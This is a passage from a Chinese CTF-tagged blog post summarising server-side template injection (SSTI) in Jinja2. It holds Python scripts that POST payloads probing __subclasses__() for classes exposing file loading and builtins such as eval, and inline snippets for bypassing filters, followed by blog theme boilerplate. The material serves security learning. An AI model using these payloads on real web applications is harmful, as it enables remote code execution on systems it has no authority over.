+url<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入URL链接：'</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"&#123;&#123;().__class.__base__.__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"]&#125;&#125;"</span><span class="token punctuation">&#125;</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token comment">#print(response.text)</span>
+        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> <span class="token string">'_frozen_importlib_external.FileLoader'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            	<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>脚本灵活运用，按照实际情况修改<br><img src="https://img-blog.csdnimg.cn/75239b4fe04e4ce3b6eb5b55bc11f334.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/df0ff4b811074b499ae0fef8df76734f.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/306d33271c3341f68d9922a4f308591d.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/eb63bef8c10341eea65da7ec1eb02690.png" alt="123"></p>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>内建函数：python在执行脚本时自动加载的函数<br>脚本：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+url<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入URL链接：'</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"&#123;&#123;().__class.__base__.__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"].__init__.__globals__['__builtins__']&#125;&#125;"</span><span class="token punctuation">&#125;</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token comment">#print(response.text)</span>
+        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> <span class="token string">'eval'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/6721439df92e49ac8f19f59ef2a72dee.png" alt="123"></p>
+<p><code>&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;</code><br>显示出当前目录有哪些内置的对象和函数<br><img src="https://img-blog.csdnimg.cn/52affb08455e46979134e9f9007df484.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/fb950d9977db4dbf8b5cdd198d375543.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/3b890900c6e64a8cb894283d4f54549e.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/8318ba4390ef4d55ba6180f9e3d72d71.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/eb210962dd7946399de23043c7bcc9c2.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/7e6bbbaf4ace4c32b4e022a06cb73dd6.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/2f7da1b5b3e94582ba7e48918c73d01d.png" alt="123"></p>
+<h3 id="绕过过滤双大括号"><a href="#绕过过滤双大括号" class="headerlink" title="绕过过滤双大括号"></a>绕过过滤双大括号</h3><p><img src="https://img-blog.csdnimg.cn/843f81905523465d81afb8d2ca8c14e7.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/44f353805abf4973bc97d424f7055dc7.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/9e890759aafd44ee880e1d2449eed86b.png" alt="456"></p>
+<p><img src="https://img-blog.csdnimg.cn/0a11a96296bb45e8b97038bd17f989f4.png" alt="456"></p>
+<h3 id="无回显SSTI"><a href="#无回显SSTI" class="headerlink" title="无回显SSTI"></a>无回显SSTI</h3><p><img src="https://img-blog.csdnimg.cn/82b05ea854bd43c4a6689747d03aaf90.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/58f91b0ea44945efbea06531fa8d0c18.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/d3ccb83ee5d84e29b3439bda5ccc472b.png" alt="789"></p>
+<p><img src="https://img-blog.csdnimg.cn/672ebb6c2fc04b70a944b1a5adeb2000.png" alt="123"></p>
+<h3 id="getitem绕过中括号过滤"><a href="#getitem绕过中括号过滤" class="headerlink" title="getitem绕过中括号过滤"></a>getitem绕过中括号过滤</h3><p> 正常使用<code>[]</code>时<br><code> &#123;&#123;''.__calss__.__base__.subclasses__()[117]&#125;&#125;</code><br>使用getitem绕过<br><code>&#123;&#123;''.__calss__.__base__.subclasses__().__getitem__(117)&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/a9db3d6fefeb43b79b67cba773b9b35f.png" alt="123"></p>
+<h3 id="request绕过单双引号过滤"><a href="#request绕过单双引号过滤" class="headerlink" title="request绕过单双引号过滤"></a>request绕过单双引号过滤</h3><p><img src="https://img-blog.csdnimg.cn/0498fbef7bdf44af8fb9901a42397b70.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/0d25651fb09747b58d80bf62fd7a4924.png" alt="123"> <img src="https://img-blog.csdnimg.cn/4fa2f3bb6f31499ca1cd233021e76b3a.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/b2a5b3fea2be4f459debf419da9c668d.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/9725d59f92c6414fa6bf79e987ef8d41.png" alt="456"></p>
+<h3 id="过滤器绕过下划线过滤"><a href="#过滤器绕过下划线过滤" class="headerlink" title="过滤器绕过下划线过滤"></a>过滤器绕过下划线过滤</h3><p><img src="https://img-blog.csdnimg.cn/c94604ff42234859be94be5fd95995d1.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/9f77f111586a4a7bb36576882e392bd0.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/e54f250d97794204bd0ea7a7a5358e8d.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/a9ab18ed669941afa2e9ab7a3a000480.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/b2605697c1f0494baff5ae23a6195692.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/d50175a108264f048e38e4162bf25d2d.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/766e77f05f154194bf82a7b2e5298e03.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/2bcf11b047e348c8b4d36ddd1b71af40.png" alt="789"></p>
+<h3 id="中括号绕过点过滤"><a href="#中括号绕过点过滤" class="headerlink" title="中括号绕过点过滤"></a>中括号绕过点过滤</h3><p><img src="https://img-blog.csdnimg.cn/07a73d95f15949b994c50dda1355bdaf.png" alt="789"></p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://3143047748.github.io/2023/11/15/SSTI%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%AD%A6%E4%B9%A0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2023/11/13/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">第六届强网拟态防御国际精英挑战赛初赛</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "5s6sYhVyYIhL1fb7zrErH8BX-gzGzoHsz",
+    app_key: "829xTABHQSNKYRHRILDlEluh",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022-2023
+        <i class="ri-heart-fill heart_icon"></i> n0rt6
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="https://beian.miit.gov.cn/" target="_black" rel="nofollow">豫ICP备88888888</a>
+        </li>
+        
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.png" alt="n0rt6&#39;s blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">Index</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">Archives</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">Categories</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">Tags</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">Friends</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">About Me</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=22707008&auto=0&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
